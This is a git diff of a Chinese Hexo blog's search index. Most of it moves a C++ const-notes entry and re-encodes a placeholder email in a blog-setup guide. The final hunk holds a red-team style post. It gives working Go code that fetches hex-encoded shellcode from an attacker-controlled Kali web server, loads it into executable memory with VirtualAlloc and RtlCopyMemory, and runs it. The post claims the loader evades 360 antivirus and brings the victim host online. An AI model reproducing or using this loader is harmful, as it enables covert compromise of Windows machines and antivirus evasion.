@@ -1,33 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>c++学习-light-city</title>
-    <url>/2022/11/01/c-%E5%AD%A6%E4%B9%A0-light-city/</url>
-    <content><![CDATA[<h2 id="关于github上light-city佬c-进阶的学习笔记"><a href="#关于github上light-city佬c-进阶的学习笔记" class="headerlink" title="关于github上light-city佬c++进阶的学习笔记"></a>关于github上light-city佬c++进阶的学习笔记</h2><p>先附上github地址：<a href="https://github.com/Light-City/CPlusPlusThings">https://github.com/Light-City/CPlusPlusThings</a></p>
-<hr>
-<span id="more"></span>
-<ol>
-<li>const的使用</li>
-</ol>
-<ul>
-<li>const和指针 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> * a;</span><br><span class="line"><span class="type">char</span> <span class="type">const</span> * a;</span><br><span class="line"><span class="comment">//上面两种等价，皆为指向const对象的指针</span></span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> a;<span class="comment">//指向char对象的const指针，或者说常指针、const指针</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> a;<span class="comment">//指向const对象的const指针</span></span><br></pre></td></tr></table></figure>
- <strong>即const位于*左边是指向const对象，位于*右边是const指针</strong><br> 允许把非const的对象地址赋值给指向const对象的指针，不能通过指向const对象的指针修改变量的值</li>
-</ul>
-<ol start="2">
-<li>在函数中使用const</li>
-</ol>
-<ul>
-<li>在形参列表中无需使用const修饰变量，因为参数采用“值传递”，由函数自动产生临时变量并复制该参数，该参数无需保护。 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">const</span> <span class="type">int</span> var)</span></span>; <span class="comment">// 传递过来的参数不可变</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> *<span class="type">const</span> var)</span></span>; <span class="comment">// 指针本身不可变</span></span><br></pre></td></tr></table></figure></li>
-<li>参数指针所指内容为常量不可变 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StringCopy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure>
- 其中src 是输入参数，dst 是输出参数。给src加上const修饰后，如果函数体内的语句试图改动src的内容，编译器将指出错误。这就是加了const的作用之一。</li>
-</ul>
-<p> 。。。</p>
-]]></content>
-      <tags>
-        <tag>c++</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo搭建博客</title>
     <url>/2022/10/17/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<p>整理一下通过Hexo搭建博客的过程</p>
@@ -64,7 +37,7 @@
 <h2 id="三、github建站"><a href="#三、github建站" class="headerlink" title="三、github建站"></a>三、github建站</h2><ul>
 <li>首先需要github账号，此处不再赘述，默认以已经登录账号。</li>
 <li><strong>配置git</strong><br> 首先创建ssh key，在git bash中输入 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@youremail.com&quot;</span></span><br></pre></td></tr></table></figure>
-后面的<a href="mailto:&#x79;&#111;&#x75;&#114;&#x5f;&#101;&#109;&#x61;&#105;&#x6c;&#64;&#121;&#x6f;&#117;&#x72;&#101;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x79;&#111;&#x75;&#114;&#x5f;&#101;&#109;&#x61;&#105;&#x6c;&#64;&#121;&#x6f;&#117;&#x72;&#101;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>改为你在github上注册的邮箱，之后会要求确认路径和输入密码。成功后会在~&#x2F;下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。</li>
+后面的<a href="mailto:&#121;&#111;&#117;&#x72;&#x5f;&#x65;&#x6d;&#x61;&#105;&#x6c;&#x40;&#x79;&#111;&#117;&#114;&#x65;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#121;&#111;&#117;&#x72;&#x5f;&#x65;&#x6d;&#x61;&#105;&#x6c;&#x40;&#x79;&#111;&#117;&#114;&#x65;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a>改为你在github上注册的邮箱，之后会要求确认路径和输入密码。成功后会在~&#x2F;下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。</li>
 </ul>
 <p>回到github上，进入Acount Settings，左边选择SSH Keys，Add SSH Key,粘贴刚刚生成的key<br><img src="https://s2.loli.net/2022/10/17/2HMfiOGVaPRD3Sn.jpg" alt="4.png"></p>
 <ul>
@@ -89,6 +62,33 @@
 ]]></content>
       <tags>
         <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c++学习-light-city</title>
+    <url>/2022/11/01/c-%E5%AD%A6%E4%B9%A0-light-city/</url>
+    <content><![CDATA[<h2 id="关于github上light-city佬c-进阶的学习笔记"><a href="#关于github上light-city佬c-进阶的学习笔记" class="headerlink" title="关于github上light-city佬c++进阶的学习笔记"></a>关于github上light-city佬c++进阶的学习笔记</h2><p>先附上github地址：<a href="https://github.com/Light-City/CPlusPlusThings">https://github.com/Light-City/CPlusPlusThings</a></p>
+<hr>
+<span id="more"></span>
+<ol>
+<li>const的使用</li>
+</ol>
+<ul>
+<li>const和指针 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> * a;</span><br><span class="line"><span class="type">char</span> <span class="type">const</span> * a;</span><br><span class="line"><span class="comment">//上面两种等价，皆为指向const对象的指针</span></span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> a;<span class="comment">//指向char对象的const指针，或者说常指针、const指针</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * <span class="type">const</span> a;<span class="comment">//指向const对象的const指针</span></span><br></pre></td></tr></table></figure>
+ <strong>即const位于*左边是指向const对象，位于*右边是const指针</strong><br> 允许把非const的对象地址赋值给指向const对象的指针，不能通过指向const对象的指针修改变量的值</li>
+</ul>
+<ol start="2">
+<li>在函数中使用const</li>
+</ol>
+<ul>
+<li>在形参列表中无需使用const修饰变量，因为参数采用“值传递”，由函数自动产生临时变量并复制该参数，该参数无需保护。 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">const</span> <span class="type">int</span> var)</span></span>; <span class="comment">// 传递过来的参数不可变</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> *<span class="type">const</span> var)</span></span>; <span class="comment">// 指针本身不可变</span></span><br></pre></td></tr></table></figure></li>
+<li>参数指针所指内容为常量不可变 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StringCopy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure>
+ 其中src 是输入参数，dst 是输出参数。给src加上const修饰后，如果函数体内的语句试图改动src的内容，编译器将指出错误。这就是加了const的作用之一。</li>
+</ul>
+<p> 。。。</p>
+]]></content>
+      <tags>
+        <tag>c++</tag>
       </tags>
   </entry>
   <entry>
@@ -147,7 +147,7 @@
 <p>利用rc4对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。<br>将生成的shellcode部署到kali并开启apache2服务</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> /var/www/html/1.html</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
 <p>将生成的shellcode复制到1.html文件。<br>另外关于外网访问问题，可以使用frp+vps的方式解决在此不再赘述。<br>附上相关链接: <em><a href="https://blog.csdn.net/monster663/article/details/126797109">frp内网穿透—将kali代理在公网中进行渗透测试</a></em></p>
-<p>之后编写go代码远程访问1.html获取shellcode并加载</p>
+<p><strong>3.之后编写go代码远程访问1.html获取shellcode并加载</strong></p>
 <p>以下:</p>
 <figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcodeBuf, err := GetShellCode()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	execute(shellcodeBuf)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetShellCode</span><span class="params">()</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://x/1.html&quot;</span>)<span class="comment">//即kali主机地址</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	shellcodeBuf, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(shellcodeBuf), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">execute</span><span class="params">(shellcodeBuf <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	shellcode, err := hex.DecodeString(shellcodeBuf)</span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	RtlCopyMemory.Call(</span><br><span class="line">		addr,</span><br><span class="line">		<span class="type">uintptr</span>(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])),</span><br><span class="line">		<span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">	)</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>之后可绕过360静态检测和动态监测，成功上线。</p>
